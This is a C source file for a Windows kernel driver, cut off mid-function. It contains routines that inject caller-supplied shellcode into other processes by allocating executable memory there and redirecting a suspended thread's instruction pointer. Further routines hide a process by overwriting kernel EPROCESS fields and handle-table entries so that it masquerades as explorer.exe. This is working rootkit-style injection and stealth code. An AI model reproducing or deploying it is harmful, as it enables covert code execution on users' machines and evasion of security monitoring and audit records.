#pragma once
#include "prockr.h"



///*根据模块名取模块基址*/
SKSTATUS KrGetProcModuleBaseByName(ULONG pid, char* moduleName,PULONG64 base) {
	SKSTATUS ret = NULL;
	if (moduleName == NULL || !MmIsAddressValid(moduleName) || !MmIsAddressValid(base))
	{
		return SK_FAILED_GETPROCMODULEBASE_BADPARAM;
	}
	PEPROCESS proc = KrGetEprocByPid(pid);
	if (!proc || PsGetProcessExitStatus(proc) != 0x103)
	{
		return SK_FAILED_GETPROCMODULEBASE_INVALIDPID;
	}

	char* name = (char*)ExAllocatePool(NonPagedPool, 0x200);
	if (!name)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	strcpy(name, moduleName);

	ULONG_PTR mBase = NULL;
	PPEB32 peb32 = NULL;
	MY_ATTACH_OBJ ma = { 0 };
	MyAttack(*(PULONG64)((PUCHAR)proc + 0x28),&ma);
	ret = PsGetWow64ProcPeb32(proc, &peb32);
	MyDeatch(&ma);
	
	if (peb32)
	{
		//wow64	
		ret = KrFindWow64ModuleBaseFromPebByName(peb32, name,&mBase, *(PULONG64)((PUCHAR)proc + 0x28));
	}
	else {
		//X64
		PPEB peb64 = (PPEB)PsGetProcessPeb(proc);
		ret = KrFindX64ModuleBaseFromPebByName(peb64, name,&mBase, *(PULONG64)((PUCHAR)proc + 0x28));
	}
	ExFreePool(name);
	*base = mBase;
	return ret;
}

/*从PEB链表中获取指定Wow64进程基址*/
SKSTATUS KrFindWow64ModuleBaseFromPebByName(PPEB32 peb, char* moduleName, ULONG_PTR* base, ULONG64 cr3) {
	/*if (!peb || !MmIsAddressValid(peb) || !MmIsAddressValid(moduleName) || !MmIsAddressValid(base))
	{
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}*/
	if (!peb || !MmIsAddressValid(moduleName) || !MmIsAddressValid(base))
	{
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}
	MY_ATTACH_OBJ ma = { 0 };
	MyAttack(cr3,&ma);
	if (!MmIsAddressValid(peb))
	{
		MyDeatch(&ma);
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}
	ULONG64 tempDllBase = 0;
	PPEB_LDR_DATA32 ldrData = (PPEB_LDR_DATA32)peb->Ldr;
	if (!MmIsAddressValid(ldrData))
	{
		MyDeatch(&ma);
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}
	PLDR_DATA_TABLE_ENTRY32 begin = (PLDR_DATA_TABLE_ENTRY32)ldrData->InLoadOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY32 next = (PLDR_DATA_TABLE_ENTRY32)begin;
	MyDeatch(&ma);
	do
	{
		MyAttack(cr3,&ma);
		tempDllBase = next->DllBase;
		MyDeatch(&ma);
		ANSI_STRING name = { 0 };
		UNICODE_STRING nameUni = { 0 };
		RtlInitAnsiString(&name, moduleName);
		RtlAnsiStringToUnicodeString(&nameUni, &name, TRUE);
		MyAttack(cr3,&ma);
		if (tempDllBase && _wcsicmp(nameUni.Buffer, next->BaseDllName.Buffer) == 0)
		{
			MyDeatch(&ma);
			RtlFreeAnsiString(&nameUni);
			*base = tempDllBase;
			return SK_SUCCESS;
		}
		next = (PLDR_DATA_TABLE_ENTRY32)next->InLoadOrderLinks.Flink;
		MyDeatch(&ma);
		RtlFreeAnsiString(&nameUni);
	} while (begin != next && next);
	return SK_FAILED_GETPROCMODULEBASE_NOMODULE;
}

///*从PEB链表中获取指定X64进程基址*/
SKSTATUS KrFindX64ModuleBaseFromPebByName(PPEB peb64, char* moduleName, ULONG_PTR* base, ULONG64 cr3) {
	/*if (!peb || !MmIsAddressValid(peb) || !MmIsAddressValid(moduleName) || !MmIsAddressValid(base))
	{
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}*/
	if (!peb64 || !MmIsAddressValid(moduleName) || !MmIsAddressValid(base))
	{
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}
	MY_ATTACH_OBJ ma = { 0 };
	MyAttack(cr3,&ma);
	if (!MmIsAddressValid(peb64))
	{
		MyDeatch(&ma);
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}
	ULONG64 tempDllBase = 0;
	PPEB_LDR_DATA64 ldrData = (PPEB_LDR_DATA64)(*(PULONG64)((ULONG64)peb64 + 0x18));
	if (!MmIsAddressValid(ldrData))
	{
		MyDeatch(&ma);
		return SK_FAILED_GETKERNELBASE_BADPARAM;
	}
	PLDR_DATA_TABLE_ENTRY64 begin = (PLDR_DATA_TABLE_ENTRY64)ldrData->InLoadOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY64 next = (PLDR_DATA_TABLE_ENTRY64)begin;
	MyDeatch(&ma);
	do
	{
		ANSI_STRING name = { 0 };
		UNICODE_STRING nameUni = { 0 };
		MyAttack(cr3, &ma);
		tempDllBase = next->DllBase;
		MyDeatch(&ma);
		RtlInitAnsiString(&name, moduleName);
		RtlAnsiStringToUnicodeString(&nameUni, &name, TRUE);
		MyAttack(cr3, &ma);
		if (tempDllBase && _wcsicmp(nameUni.Buffer, next->BaseDllName.Buffer) == 0)
		{
			MyDeatch(&ma);
			RtlFreeAnsiString(&nameUni);
			*base = tempDllBase;
			return SK_SUCCESS;
		}
		next = (PLDR_DATA_TABLE_ENTRY64)next->InLoadOrderLinks.Flink;
		MyDeatch(&ma);
		RtlFreeAnsiString(&nameUni);
	} while (begin != next && next);
	return SK_FAILED_GETPROCMODULEBASE_NOMODULE;
}


SKSTATUS MmRemoteCallByWriteContext(ULONG64 pid,ULONG64 tid,ULONG64 mode,ULONG64 shellcode,ULONG64 codeLen) {
	if (shellcode >= MmHighestUserAddress || (shellcode + codeLen) > MmHighestUserAddress || shellcode < 0x1000 || !MmIsAddressValid(shellcode) || !MmIsAddressValid(shellcode + codeLen - 1))
	{
		return SK_FAILED_RMCALL_BADPARAM;
	}
	RemoteCallPackage pack = { 0 };
	pack.pid = pid;
	pack.tid = tid;
	pack.mode = mode;
	pack.shellcode = shellcode;
	pack.codeLen = codeLen;

	PEPROCESS proc = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(pack.pid, &proc);
	SKSTATUS ret = NULL;
	if (!NT_SUCCESS(status) || PsGetProcessExitStatus(proc) != 0x103)
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_RMCALL_INVALIDPID;
	}
	ObDereferenceObject(proc);
	PETHREAD thread = NULL;
	if (tid)
	{
		status = PsLookupThreadByThreadId(pack.tid, &thread);
		if (NT_SUCCESS(status)) {
			ObDereferenceObject(thread);
		}
		else
		{
			thread = NtGetProcessMainThread(proc);
		}
	}
	else
	{
		thread = NtGetProcessMainThread(proc);
	}
	if (!thread)
	{
		return SK_FAILED_RMCALL_INVALIDTID;
	}
	//if (!NT_SUCCESS(status))
	//{
	//	EcUpdateLastSysErrCode(status);
	//	return SK_FAILED_RMCALL_INVALIDTID;
	//}
	

	


	PEPROCESS apcProc = NULL;
	ret = PsGetThreadApcProcess(thread,&apcProc);
	if (ret != SK_SUCCESS)
	{
		return SK_FAILED_RMCALL_INVALIDTID;
	}
	PsSuspendThreadProc SuspendThread = NULL;
	ret = KrGetPsSuspendThreadAddr(&SuspendThread);
	if (ret != SK_SUCCESS)
	{
		return SK_FAILED_RMCALL_GETSUSPENDADDR;
	}

	PsResumeThreadProc ResumeThread = NULL;
	ret = KrGetPsResumeThreadAddr(&ResumeThread);
	if (ret != SK_SUCCESS)
	{
		return SK_FAILED_RMCALL_GETRESUMEADDR;
	}

	PPEB32 peb32 = NULL;
	ret = PsGetWow64ProcPeb32(proc,&peb32);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}

	status = SuspendThread(thread, NULL);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_RMCALL_SUSPEND;
	}
	if (peb32)
	{
		ret = MmRemoteCallToWow64Proc(&pack, thread, proc);
	}
	else {
		//X64
		ret = MmRemoteCallToX64Proc(&pack, thread, proc);
	}
	status = ResumeThread(thread, NULL,1);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_RMCALL_RESUME;
	}
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	return SK_SUCCESS;
}

VOID RMC_FreeVirtualMemory(PRemoteCallPackage pack) {
	PEPROCESS proc = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(pack->pid, &proc);
	BOOLEAN ret = FALSE;
	if (!NT_SUCCESS(status))
	{
		ExFreePool(pack);
		return;
	}
	PETHREAD thread = NULL;
	status = PsLookupThreadByThreadId(pack->tid, &thread);
	if (!NT_SUCCESS(status))
	{
		ExFreePool(pack);
		ObDereferenceObject(proc);
		return;
	}

	KAPC_STATE apc = { 0 };
	PULONG sign = (PULONG)ExAllocatePool(NonPagedPool, 8);
	KeStackAttachProcess(proc, &apc);
	while (1)
	{
		if (PsGetProcessExitStatus(proc) != 0x103)
		{
			break;
		}
		memcpy(sign, pack->shellcode + pack->signOffset, 4);
		if (*sign)
		{
			CpMySleepMin(3000);
			break;
		}
		CpMySleepMin(100);
	}
	ULONG64 len = pack->codeLen + 0x500;
	ZwFreeVirtualMemory(-1, &pack->shellcode, &len, MEM_RELEASE);
	KeUnstackDetachProcess(&apc);
	ExFreePool(pack);
	ObDereferenceObject(proc);
	ObDereferenceObject(thread);
}

SKSTATUS MmRemoteCallToWow64Proc(PRemoteCallPackage pack, PETHREAD thread, PEPROCESS proc) {
	if (pack->mode != 0)
	{
		return SK_FAILED_RMCALL_BADMODE;
	}
	PTEB64 teb = NULL;
	SKSTATUS ret = NULL;
	ret = PsGetThreadTeb64(thread,&teb);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	UCHAR assm[] = { 0xFF,0x05,0,0,0,0,0xFF,0x25,0,0,0,0 };

	PUCHAR codeT = (PUCHAR)ExAllocatePool(NonPagedPool, pack->codeLen + 0x500);
	if (!codeT)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	PRemoteCallPackage packT = (PRemoteCallPackage)ExAllocatePool(NonPagedPool, sizeof(RemoteCallPackage));
	if (!packT)
	{
		ExFreePool(codeT);
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(packT, 0, sizeof(RemoteCallPackage));
	memcpy(packT, pack, sizeof(RemoteCallPackage));
	memset(codeT, 0, packT->codeLen + 0x500);
	memcpy(codeT, packT->shellcode, packT->codeLen);
	memcpy(codeT + packT->codeLen, assm, sizeof(assm));

	KAPC_STATE apc = { 0 };
	KeStackAttachProcess(proc, &apc);
	PCONTEXT32 con = (PCONTEXT32)((PUCHAR)teb->TlsSlots[1] + 4);

	PUCHAR base = NULL;
	ULONG64 size = packT->codeLen + 0x500;
	NTSTATUS status = ZwAllocateVirtualMemory(-1, &base, NULL, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ExFreePool(codeT);
		ExFreePool(packT);
		KeUnstackDetachProcess(&apc);
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCATEPROCMEM;
	}
	memcpy(base, codeT, packT->codeLen + 0x500);

	ULONG64 sign = (ULONG64)base + packT->codeLen + sizeof(assm);

	*(PULONG)(base + packT->codeLen + 0x2) = sign + 8;
	*(PULONG)(base + packT->codeLen + 0x8) = sign;
	*(PULONG64)(sign) = con->Eip;
	con->Eip = base;
	ExFreePool(codeT);
	KeUnstackDetachProcess(&apc);

	HANDLE tHandle = NULL;
	packT->shellcode = base;
	packT->signOffset = packT->codeLen + sizeof(assm) + 8;
	status = PsCreateSystemThread(&tHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, RMC_FreeVirtualMemory, packT);
	if (NT_SUCCESS(status)) {
		ZwClose(tHandle);//相当于CloseHandle
		return SK_SUCCESS;
	}
	EcUpdateLastSysErrCode(status);
	return SK_FAILED_CREATESYSTHREAD;
}

SKSTATUS MmRemoteCallToX64Proc(PRemoteCallPackage pack, PETHREAD thread, PEPROCESS proc) {
	if (pack->mode != 1)
	{
		return SK_FAILED_RMCALL_BADMODE;
	}
	PKTRAP_FRAME trapFrame = NULL;
	SKSTATUS ret = NULL;
	ret = PsGetThreadTrapFrame(thread,&trapFrame);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	PUCHAR codeT = (PUCHAR)ExAllocatePool(NonPagedPool, pack->codeLen + 0x500);
	if (!codeT)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	PRemoteCallPackage packT = (PRemoteCallPackage)ExAllocatePool(NonPagedPool, sizeof(RemoteCallPackage));
	if (!packT)
	{
		ExFreePool(codeT);
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(packT, 0, sizeof(RemoteCallPackage));
	memcpy(packT, pack, sizeof(RemoteCallPackage));
	UCHAR assm[] = { 0x50,0x48,0xB8,0x78,0x56,0x34,0x12,0x78,0x56,0x34,0x12,0x48,0xFF,0x00,0x58,0xFF,0x25,0x00,0x00,0x00,0x00 };
	/*
	push rax
	mov rax,XXX
	inc qword ptr ds:[rax]
	pop rax
	jmp [xxxx]
	*/
	memset(codeT, 0, packT->codeLen + 0x500);
	memcpy(codeT, packT->shellcode, packT->codeLen);
	memcpy(codeT + packT->codeLen, assm, sizeof(assm));

	KAPC_STATE apc = { 0 };
	KeStackAttachProcess(proc, &apc);

	PUCHAR base = NULL;
	ULONG64 size = packT->codeLen + 0x500;
	NTSTATUS status = ZwAllocateVirtualMemory(-1, &base, NULL, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		ExFreePool(codeT);
		ExFreePool(packT);
		KeUnstackDetachProcess(&apc);
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCATEPROCMEM;
	}
	memcpy(base, codeT, packT->codeLen + 0x500);
	ULONG64 sign = (ULONG64)base + packT->codeLen + sizeof(assm);
	*(PULONG64)(base + packT->codeLen + 0x3) = sign + 8;
	*(PULONG64)(sign) = trapFrame->Rip;
	trapFrame->Rip = base;
	ExFreePool(codeT);
	KeUnstackDetachProcess(&apc);

	HANDLE tHandle = NULL;
	packT->shellcode = base;
	packT->signOffset = packT->codeLen + sizeof(assm) + 8;
	status = PsCreateSystemThread(&tHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, RMC_FreeVirtualMemory, packT);
	if (NT_SUCCESS(status)) {
		ZwClose(tHandle);//相当于CloseHandle
		return SK_SUCCESS;
	}
	EcUpdateLastSysErrCode(status);
	return SK_FAILED_CREATESYSTHREAD;
}


SKSTATUS PeGetExportFuncAddrOfProcModule(ULONG64 pid, char* moduleName, char* funcName,PULONG64 funcBase) {
	if (pid == NULL || !MmIsAddressValid(moduleName) || !MmIsAddressValid(funcName))
	{
		return SK_FAILED_GETPROCEXP_BADPARAM;
	}
	PEPROCESS proc = NULL;
	SKSTATUS ret = NULL;
	NTSTATUS ntRet = PsLookupProcessByProcessId(pid, &proc);
	if (!NT_SUCCESS(ntRet) || PsGetProcessExitStatus(proc) != 0x103)
	{
		EcUpdateLastSysErrCode(ntRet);
		return SK_FAILED_GETPROCEXP_INVALIDPID;
	}
	ObDereferenceObject(proc);

	PUCHAR mName = (PUCHAR)ExAllocatePool(NonPagedPool, strlen(moduleName) + 100);
	if (!mName)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(mName, 0, strlen(moduleName) + 100);


	PUCHAR fName = (PUCHAR)ExAllocatePool(NonPagedPool, strlen(funcName) + 100);
	if (!fName)
	{
		ExFreePool(mName);
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(fName, 0, strlen(funcName) + 100);

	ULONG64 addr = 0;
	KAPC_STATE apc = { 0 };
	
	memcpy(fName, funcName, strlen(funcName) + 1);
	memcpy(mName, moduleName, strlen(moduleName) + 1);
	KeStackAttachProcess(proc, &apc);
	ULONG64 base = NULL;
	ret = KrGetProcModuleBaseByName(pid, mName,&base);
	if (ret != SK_SUCCESS)
	{
		KeUnstackDetachProcess(&apc);
		ExFreePool(mName);
		ExFreePool(fName);
		return SK_FAILED_GETPROCEXP_MODULENOTEXIST;
	}
	ret = PeGetExportFuncAddr64((PUCHAR)base, fName,&addr);
	if (ret != SK_SUCCESS)
	{
		ret = PeGetExportFuncAddr32((PUCHAR)base, fName, &addr);
	}
	KeUnstackDetachProcess(&apc);

	ExFreePool(mName);
	ExFreePool(fName);
	*funcBase = addr;
	return SK_SUCCESS;
}

ULONG64 mAddr[0x1000] = { 0 };
ULONG64 mSize[0x1000] = { 0 };
SKSTATUS MmAllocateProcMemory(ULONG64 pid, ULONG64 size,PULONG64 mmBase) {
	if (!MmIsAddressValid(mmBase))
	{
		return SK_FAILED_ALLOCAPROCMM_BADPARAM;
	}
	//修改内存属性
	ULONG64 oldProtect = NULL;
	SKSTATUS ret = NULL;
	pZwProtectVirtualMemory ProtectVirtualMemory = NULL;
	ret = KrGetVirtualProtectFuncAddr(&ProtectVirtualMemory);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	ULONG64 mIndex = 0;
	for (ULONG64 i = 0; i < 0x1000; i++)
	{
		if (mAddr[i] == 0) {
			mIndex = i;
			mSize[i] = 0;
			break;
		}
	}
	PEPROCESS proc = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(pid, &proc);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCAPROCMM_INVALIDPID;
	}
	ObDereferenceObject(proc);

	ULONG64 s = size;
	ULONG64 base = *mmBase;
	KAPC_STATE apc = { 0 };
	KeStackAttachProcess(proc, &apc);
	status = ZwAllocateVirtualMemory(-1, &base, NULL, &s, MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);
	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apc);
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCAPROCMM_ALLOCATE;
	}
	ULONG64 baseP = base;
	status = ProtectVirtualMemory(-1, &baseP, &s, PAGE_EXECUTE_READ, &oldProtect);
	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apc);
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCAPROCMM_CHANGEPROTECT;
	}
	//memset(base, 0, s);
	
	KeUnstackDetachProcess(&apc);
	mAddr[mIndex] = base;
	mSize[mIndex] = s;
	mIndex++;
	*mmBase = base;
	return SK_SUCCESS;
}


SKSTATUS MmFreeProcMemory(ULONG64 pid, ULONG64 base) {
	ULONG64 tIndex = NULL;
	BOOLEAN needFree = FALSE;
	ULONG64 tBase = NULL;
	ULONG64 tSize = NULL;
	SKSTATUS ret = NULL;
	for (ULONG64 i = 0; i < 0x1000; i++)
	{
		if (mAddr[i] == base)
		{
			needFree = TRUE;
			tIndex = i;
			break;
		}
	}
	if (!needFree)
	{
		return SK_FAILED_ALLOCAPROCMM_NOTALLOCATE;
	}
	tBase = base;
	tSize = mSize[tIndex];

	PEPROCESS proc = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(pid, &proc);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCAPROCMM_INVALIDPID;
	}
	ObDereferenceObject(proc);

	KAPC_STATE apc = { 0 };
	KeStackAttachProcess(proc, &apc);
	status = ZwFreeVirtualMemory(-1, &tBase, &tSize, MEM_RELEASE);
	if (!NT_SUCCESS(status))
	{
		KeUnstackDetachProcess(&apc);
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_ALLOCAPROCMM_FREE;
	}
	//if (MmIsAddressValid(tBase))
	//{
	//	ret = ZwFreeVirtualMemory(-1, &tBase, &tSize, MEM_RELEASE);
	//}
	//else {
	//	ret = STATUS_UNSUCCESSFUL;
	//}
	KeUnstackDetachProcess(&apc);
	mAddr[tIndex] = 0;
	mSize[tIndex] = 0;
	return SK_SUCCESS;
}


SKSTATUS MmFindProcAddrBySignCode(ULONG64 pid, ULONG64 base, char* sign, ULONG64 len,PULONG64 addrBase) {
	if (!MmIsAddressValid(sign) || !MmIsAddressValid(addrBase))
	{
		return SK_FAILED_PROCSIGNSEARCH_BADPARAM;
	}
	PEPROCESS proc = NULL;
	SKSTATUS ret = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(pid, &proc);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_PROCSIGNSEARCH_INVALIDPID;
	}
	ObDereferenceObject(proc);
	PUCHAR n = (PUCHAR)ExAllocatePool(NonPagedPool, strlen(sign) + 0x100);
	if (!n)
	{
		return SK_FAILED_ALLOCATEPOOL;
	}
	memset(n, 0, strlen(sign) + 0x100);
	memcpy(n, sign, strlen(sign));
	KAPC_STATE apc = { 0 };
	KeStackAttachProcess(proc, &apc);
	ULONG64 code = NULL;
	ret = MmFindAddrBySignCode(base, n, len, &code);
	KeUnstackDetachProcess(&apc);
	ExFreePool(n);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	*addrBase = code;
	return SK_SUCCESS;
}

SKSTATUS PsGetPidByName(char* pname,PULONG64 pidOut) {
	UNICODE_STRING string = { 0 };
	SKSTATUS ret = NULL;
	//RtlInitUnicodeString(&string, L"PsGetProcessImageFileName");
	//typedef PUCHAR(NTAPI* MyPsGetProcessImageFileName)(ULONG64 eproc);
	//MyPsGetProcessImageFileName addr = (MyPsGetProcessImageFileName)MmGetSystemRoutineAddress(&string);
	//if (!addr || !MmIsAddressValid(addr))
	//{
	//	return SK_FAILED_HIDEPROC_GETSYSFUNC_PsGetProcessImageFileName;
	//}
	for (ULONG64 i = 0; i < 30000; i += 4)
	{
		PEPROCESS proc = proc = KrGetEprocByPid(i);
		if (!proc)
		{
			continue;
		}
		if (PsGetProcessExitStatus(proc)!=0x103)
		{
			continue;
		}
		//PUCHAR nameNow = addr(proc);
		PUCHAR nameNow = *(PULONG64)((ULONG64)proc + SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS,SYM_STRUCTMEM_EPROCESS_ImageFileName));
		if (nameNow && !_strnicmp(pname, nameNow,strlen(pname)))
		{
			ULONG64 offset = SymGetMemOffOfStruct(SYM_MOD_NTOS,SYM_STRUCT_EPROCESS,SYM_STRUCTMEM_EPROCESS_UniqueProcessId);
			*pidOut = *(PULONG64)((PUCHAR)proc + offset);
			return SK_SUCCESS;
		}
	}
	return SK_FAILED_KRTOOL_GETSYSFUNC_GETPIDBYNAME;
}

/*在虚拟机中要摘除CreateProcess内核钩子*/
/*抹全局句柄表保护进程*/
SKSTATUS FcProtectProcessByGlobalHandleTable(ULONG64 pid, ULONG64 dstPid,ULONG64 NeedClearObject) {
	ULONG64 fakePid = 0;
	SKSTATUS ret = NULL;
	PUCHAR pExpLookupHandleTableEntry = NULL;
	ret = KrGetExpLookupHandleTableEntryAddr(&pExpLookupHandleTableEntry);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	PUCHAR pGlobalHandleTable = NULL;
	ret = KrGetGlobalHandleTablePointer(&pGlobalHandleTable);
	if (ret != SK_SUCCESS)
	{
		return ret;
	}
	typedef PULONG64(NTAPI* MyExpLookupHandleTableEntry)(ULONG64 arg1, ULONG64 pid);
	MyExpLookupHandleTableEntry func = (MyExpLookupHandleTableEntry)pExpLookupHandleTableEntry;
	PULONG64 handle = func(*(PULONG64)pGlobalHandleTable, pid);
	if (dstPid)
	{
		fakePid = dstPid;
	}
	else {
		ret = PsGetPidByName("explorer.exe",&fakePid);
		if (ret != SK_SUCCESS)
		{
			return ret;
		}
	}
	if (!fakePid)
	{
		return SK_FAILED_HIDEPROC_DSTPIDNOTEXIST;
	}
	
	PULONG64 fakeHandle = func(*(PULONG64)pGlobalHandleTable, fakePid);
	if (handle && fakeHandle)
	{
		ret = HideProcessEx(pid, fakePid);
		if (ret != SK_SUCCESS)
		{
			return ret;
		}
		if (NeedClearObject)
		{
			*handle = *fakeHandle;
			*(handle + 1) = *(fakeHandle + 1);
		}

		return SK_SUCCESS;
	}
	else
	{
		return SK_FAILED_HIDEPROC_DSTPROCHANDLENOTEXIST;
	}
}

ULONG64 MyMiSectionControlArea(ULONG64 a1) {
	ULONG64 v1 = *(PULONG64)(a1 + 0x28);
	ULONG64 result = v1 & 0xFFFFFFFFFFFFFFFCL;
	if ((v1 & 1) != 0)
		return *(PULONG64)(*(PULONG64)(result + 0x28) + 0x10);
	if ((v1 & 2) != 0)
		return **(ULONG64**)(result + 0x28);
	return result;

}


SKSTATUS HideProcessEx(ULONG64 srcPid, ULONG64 fakePid) {
	PEPROCESS srcProc = NULL;
	PEPROCESS fakeProc = NULL;
	NTSTATUS status = NULL;
	ULONG buildNum = NULL;
	SKSTATUS ret = NULL;
	ret = GlbGetBuildNumber(&buildNum);
	if (ret != SK_SUCCESS)
	{
		return SK_FAILED_INITCOM_BADVERSION;
	}
	status = PsLookupProcessByProcessId(srcPid, &srcProc);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_HIDEPROC_SRCPIDNOTEXIST;
	}
	ObDereferenceObject(srcProc);
	status = PsLookupProcessByProcessId(fakePid, &fakeProc);
	if (!NT_SUCCESS(status))
	{
		EcUpdateLastSysErrCode(status);
		return SK_FAILED_HIDEPROC_DSTPIDNOTEXIST;
	}
	ObDereferenceObject(fakeProc);
	
	//1.清空EPROCESS->UniqueProcessId
	ULONG64 pidOffset = SymGetMemOffOfStruct(SYM_MOD_NTOS,SYM_STRUCT_EPROCESS,SYM_STRUCTMEM_EPROCESS_UniqueProcessId);
	//*(PULONG64)((ULONG64)srcProc + pidOffset) = 0;
	//*(PULONG64)((ULONG64)srcProc + pidOffset) = fakePid;

	//父进程
	ULONG64 InheritedOff = SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS, SYM_STRUCTMEM_EPROCESS_InheritedFromUniqueProcessId);
	*(PULONG64)((ULONG64)srcProc + InheritedOff) = *(PULONG64)((ULONG64)fakeProc + InheritedOff);

	//2.断EPROCESS->SessionProcessLinks  所有系统都是PID偏移+0x60
	
	
	//3.复制EPROCESS->ImageFileName
	ULONG64 imageFileNameOffset = SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS, SYM_STRUCTMEM_EPROCESS_ImageFileName);
	memcpy((PUCHAR)srcProc + imageFileNameOffset, (PUCHAR)fakeProc + imageFileNameOffset, 15);
	

	//4.复制EPROCESS->ImagePathHash   所有系统都是imageFileName偏移+0x4C
	ULONG64 imagePathHashOff = SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS, SYM_STRUCTMEM_EPROCESS_ImagePathHash);
	memcpy((PUCHAR)srcProc + imagePathHashOff, (PUCHAR)fakeProc + imagePathHashOff, 4);


	//5.复制EPROCESS->SeAuditProcessCreationInfo  imageFileName偏移+  7：+B0    10：+18
	ULONG64 AdpcOffset = SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS, SYM_STRUCTMEM_EPROCESS_SeAuditProcessCreationInfo);
	PUCHAR srcAdpcStr = *(PULONG64)((PUCHAR)srcProc + AdpcOffset);
	PUCHAR fakeAdpcStr = *(PULONG64)((PUCHAR)fakeProc + AdpcOffset);
	memcpy(srcAdpcStr, fakeAdpcStr, 8);
	PUCHAR newSrcAdpcStrBuf = (PUCHAR)ExAllocatePool(NonPagedPool, 0x100);
	memset(newSrcAdpcStrBuf, 0, 0x100);
	memcpy(newSrcAdpcStrBuf, *(PULONG64)(fakeAdpcStr + 8), *(PUSHORT)(fakeAdpcStr));
	*(PULONG64)(srcAdpcStr + 8) = newSrcAdpcStrBuf;

	//if (VER_INFO.dwBuildNumber == 7600 || VER_INFO.dwBuildNumber == 7601)
	//{
	//	memcpy((PUCHAR)srcProc + imageFileNameOffset + 0xB0, (PUCHAR)fakeProc + imageFileNameOffset + 0xB0, 8);
	//}
	//else {
	//	memcpy((PUCHAR)srcProc + imageFileNameOffset + 0x18, (PUCHAR)fakeProc + imageFileNameOffset + 0x18, 8);
	//}

	//6.断EPROCESS->MmProcessLinks  蓝
	//7.复制EPROCESS->SectionObject pid偏移+  7：+E8    10：+D8
	//if (VER_INFO.dwBuildNumber == 7600 || VER_INFO.dwBuildNumber == 7601)
	//{
	//	memcpy((PUCHAR)srcProc + pidOffset + 0xE8, (PUCHAR)fakeProc + pidOffset + 0xE8, 8);
	//}
	//else {
	//	memcpy((PUCHAR)srcProc + pidOffset + 0xD8, (PUCHAR)fakeProc + pidOffset + 0xD8, 8);
	//}

	//8.复制EPROCESS->SectionBaseAddress
	ULONG64 SectionBaseAddressOffset = SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS, SYM_STRUCTMEM_EPROCESS_SectionBaseAddress);
	memcpy((PUCHAR)srcProc + SectionBaseAddressOffset, (PUCHAR)fakeProc + SectionBaseAddressOffset, 8);

	//9.断KPROCESS->ProcessListEntry  蓝
	
	//处理文件对象
	//EPROCESS->SectionObject 通过PsReferenceProcessFilePointer取文件对象 FILE_OBJECT  记得解引用
	//替换FILE_OBJECT中的filename（不带盘符路径）    ObQueryNameString（带盘符路径）
	LONG SectionObjectOffset = SymGetMemOffOfStruct(SYM_MOD_NTOS, SYM_STRUCT_EPROCESS, SYM_STRUCTMEM_EPROCESS_SectionObject);
	PFILE_OBJECT srcFileObj = NULL;
	PFILE_OBJECT dstFileObj = NULL;
	status = PsReferenceProcessFilePointer(fakeProc, &dstFileObj);
	status |= PsReferenceProcessFilePointer(srcProc,&srcFileObj);
	if (NT_SUCCESS(status))
	{
		srcFileObj->DeviceObject = dstFileObj->DeviceObject;
		srcFileObj->Vpb = dstFileObj->Vpb;
		srcFileObj->FsContext = dstFileObj->FsContext;
